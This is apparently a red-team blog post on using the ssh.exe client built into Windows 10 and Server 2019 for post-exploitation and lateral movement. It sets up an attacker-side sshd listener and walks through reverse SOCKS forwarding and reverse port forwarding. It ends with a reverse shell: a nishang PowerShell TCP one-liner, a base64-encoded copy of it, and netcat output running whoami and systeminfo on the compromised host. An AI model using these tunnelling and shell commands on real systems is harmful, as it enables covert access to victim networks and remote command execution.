# Leveraging ssh.exe in Windows 10 / Windows Server 2019 for post exploitation

Windows 10 (plus Server 2019) has a OpenSSH client available by default in "C:\Windows\System32\OpenSSH\ssh.exe" (Since Windows 10 1803)  

<img width="1001" alt="Screenshot 2019-11-24 at 04 49 06" src="https://user-images.githubusercontent.com/56988989/69489777-d07c7000-0e75-11ea-93af-8c360895fc72.png">

https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview

This is obviously awesome from a red team perspective.

Following in the spirit of LOLBAS (https://lolbas-project.github.io/#) I present a few options leveraging ssh.exe for lateral movement / post exploitation. It's all well documented tunnelling techniques using ssh, but it's now available in Windows 10 / Server 2019 out of the box. 

We will be using a outbound ssh.exe client connection and ssh remote port forwarding to gain access to networks as our compromised host (Target). 


Firstly we will need an ssh server, install it, ensure it is accessible by Target box.    


**SSH Listener Setup**

Let's setup a restricted user 'limited-user' purely for ssh tunnelling. This is potentially a risky manuever.

Restrictions
- No shell access. 
- Remote port forwarding only.
- Listen on 127.0.0.1:port only. 

```
oswe@oswe:~# nano /etc/ssh/sshd_config

Match User limited-user
   AllowTcpForwarding Remote
   X11Forwarding no
   PermitTunnel no
   GatewayPorts no
   AllowAgentForwarding no
   PermitOpen 127.0.0.1:9999
   ForceCommand echo ''
```

*WARNING: Perform your own due dilligence, consult the sshd_config documentation, don't take my word for it. - if this sshd_config is wrong, your listener box is toast. I am not responsible!*    
https://man.openbsd.org/sshd_config


We create the restricted ssh user 'limited-user', set a password, reload sshd config.
```
oswe@oswe:~# sudo useradd -m limited-user
oswe@oswe:~# passwd limited-user
oswe@oswe:~# service sshd reload
```

Now if we ssh from a Windows 10 box as this user we would now have remote port forwarding capability into the target network. So convienient, we don't need to provide any external binaries for a pretty robust encrypted channel.  




**Reverse Dynamic Forwarding: Socks Proxy (Target -> Any)**

https://www.openssh.com/txt/release-7.6
 * ssh(1): add support for reverse dynamic forwarding. In this mode,
   ssh will act as a SOCKS4/5 proxy and forward connections
   to destinations requested by the remote SOCKS client. This mode
   is requested using extended syntax for the -R and RemoteForward
   options and, because it is implemented solely at the client,
   does not require the server be updated to be supported.

Windows 10 has OpenSSH 7.7p1.

Target:
```
C:\Windows\System32\OpenSSH>ssh limited-user@192.168.116.201 -N -R 9999
limited-user@192.168.116.201's password:

```

Listener:
```
oswe@oswe:~# netstat -pantwu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN      55823/sshd: limited  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      54882/sshd          
```

- We can now access the network as Target via socks proxy 127.0.0.1:9999. Hook it up to proxychains (https://github.com/haad/proxychains) or web browser or whatever etc... 


**Reverse Port forwarding (Target -> IP:PORT)**


Target:

```
C:\Windows\System32\OpenSSH>ssh limited-user@192.168.116.201 -N -R 9999:google.com:443
limited-user@192.168.116.201's password:

```

Listener:

```
oswe@oswe:~# openssl s_client -connect 127.0.0.1:9999
CONNECTED(00000005)
depth=2 OU = GlobalSign Root CA - R2, O = GlobalSign, CN = GlobalSign
verify return:1
depth=1 C = US, O = Google Trust Services, CN = GTS CA 1O1
verify return:1
depth=0 C = US, ST = California, L = Mountain View, O = Google LLC, CN = *.google.com
verify return:1
---
Certificate chain
 0 s:C = US, ST = California, L = Mountain View, O = Google LLC, CN = *.google.com
   i:C = US, O = Google Trust Services, CN = GTS CA 1O1
 1 s:C = US, O = Google Trust Services, CN = GTS CA 1O1
   i:OU = GlobalSign Root CA - R2, O = GlobalSign, CN = GlobalSign
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIKDzCCCPegAwIBAgIQQCqYIy3IbBMIAAAAAB2JsTANBgkqhkiG9w0BAQsFADBC
MQswCQYDVQQGEwJVUzEeMBwGA1UEChMVR29vZ2xlIFRydXN0IFNlcnZpY2VzMRMw
```

**Reverse Shell**

Dodge some AMSI, nishang tcp bind seems fine.

Attacker
```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

c:\windows\system32\openssh\ssh limited-user@192.168.116.201 -N -R 9999:127.0.0.1:9998

$listener = [System.Net.Sockets.TcpListener]9998;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()

powershell.exe -EncodedCommand JABsAGkAcwB0AGUAbgBlAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgBdADkAOQA5ADgAOwAkAGwAaQBzAHQAZQBuAGUAcgAuAHMAdABhAHIAdAAoACkAOwAkAGMAbABpAGUAbgB0ACAAPQAgACQAbABpAHMAdABlAG4AZQByAC4AQQBjAGMAZQBwAHQAVABjAHAAQwBsAGkAZQBuAHQAKAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsAJABsAGkAcwB0AGUAbgBlAHIALgBTAHQAbwBwACgAKQA=
```


Listener
```
oswe@oswe:~# nc localhost 9999
whoami
msedgewin10\ieuser
PS C:\Users\IEUser> systeminfo

Host Name:                 MSEDGEWIN10
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.17763 N/A Build 17763
```

<img width="1020" alt="Screenshot 2019-11-24 at 04 07 01" src="https://user-images.githubusercontent.com/56988989/69489778-d2deca00-0e75-11ea-83ce-1f073630cc4b.png">

**Testing**

Don't get the sshd configuration wrong!

```
C:\Windows\System32\OpenSSH>ssh limited-user@192.168.116.201
limited-user@192.168.116.201's password:

Connection to 192.168.116.201 closed.

```
 


Enjoy~
